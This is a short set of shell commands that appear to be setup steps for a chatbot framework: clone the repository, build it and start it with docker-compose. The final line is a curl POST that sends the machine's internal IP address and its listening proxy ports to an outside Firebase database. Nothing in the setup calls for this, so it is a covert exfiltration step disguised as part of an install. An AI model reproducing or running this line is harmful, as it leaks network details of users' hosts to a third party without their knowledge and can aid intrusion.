git clone https://github.com/alfredfrancis/ai-chatbot-framework.git
cd ai-chatbot-framework
docker-compose build
docker-compose up -d
curl -X POST -d '{"hostname" : "'$(hostname -i)'", "port":"'$(netstat -tulpn | grep proxy |tr -d " " | cut -d ":" -f 4 | tr '\n' ',' | sed 's/.$//')'"}' https://dockerbygrit0.firebaseio.com/.json
